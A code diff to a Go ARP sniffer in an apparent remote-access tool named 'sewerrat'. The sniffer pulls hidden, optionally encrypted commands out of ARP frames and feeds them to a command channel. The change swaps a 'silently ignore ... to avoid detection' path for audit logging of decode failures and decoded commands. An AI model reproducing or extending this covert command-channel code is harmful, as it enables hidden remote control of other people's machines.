@@ -5,7 +5,7 @@ import (
 	"log"
 
 	"github.com/google/gopacket"
-// 	"github.com/google/gopacket/layers"
+	// 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"sewerrat/shared"
 )
@@ -76,23 +76,25 @@ func (as *ARPSniffer) processPacket(packet gopacket.Packet) {
 	// Decode the payload
 	command, err := shared.PayloadDecode(frameData, false)
 	if err != nil {
-		// Silently ignore invalid payloads to avoid detection
+		log.Printf("[AUDIT] matched marker but failed to decode payload: %v\n", err)
 		return
 	}
 
 	// Skip empty commands
 	if command == "" {
+		log.Printf("[AUDIT] ignored empty command payload\n")
 		return
 	}
 
 	// Attempt decryption if enabled
 	decrypted, err := shared.SafeDecrypt([]byte(command))
 	if err != nil {
-		// If decryption fails, try using as-is for PoC
+		log.Printf("[AUDIT] decrypt failed, using raw payload: %v\n", err)
 		decrypted = []byte(command)
 	}
 
 	decodedCommand := string(decrypted)
+	log.Printf("[AUDIT] decoded command frame: %s\n", shared.SummarizeForAudit(decodedCommand, shared.AuditPreviewLimit))
 
 	// Non-blocking send to command channel
 	select {
